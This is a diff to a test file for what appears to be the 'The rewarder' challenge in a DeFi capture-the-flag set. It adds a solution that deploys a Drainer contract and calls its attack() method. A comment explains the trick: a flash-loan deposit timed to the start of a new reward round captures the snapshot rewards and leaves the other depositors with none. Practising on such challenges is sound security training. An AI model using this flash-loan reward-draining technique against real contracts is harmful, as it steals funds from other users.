@@ -6,6 +6,7 @@ const TheRewarderPool = contract.fromArtifact('TheRewarderPool');
 const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
 const RewardToken = contract.fromArtifact('RewardToken');
 const AccountingToken = contract.fromArtifact('AccountingToken');
+const Drainer = contract.fromArtifact('Drainer');
 
 const { expect } = require('chai');
 
@@ -60,7 +61,10 @@ describe('[Challenge] The rewarder', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+        // wait required time from last round to get to new round, then deposit to the rewarderPool with a large enough flashloan to exploit math implementation (before the other depositors call distributeRewards, i.e. some frontrunning at play), at which point distributeRewards is called during the deposit; the deposit is withdrawn at the end of the call to return to the flashloan after rewards are sent to attacker, but because of the snapshot system, the rewarderPool uses the snapshotted balance of deposits (with the large flashloan at the beginning of the round), which is far higher than the other depositors deposits, causing 0 rewards for them
+        await time.increase(time.duration.days(5));
+        this.drainer = await Drainer.new(this.flashLoanPool, this.rewarderPool, this.liquidityToken, { from: attacker });
+        await this.drainer.attack();
     });
 
     after(async function () {
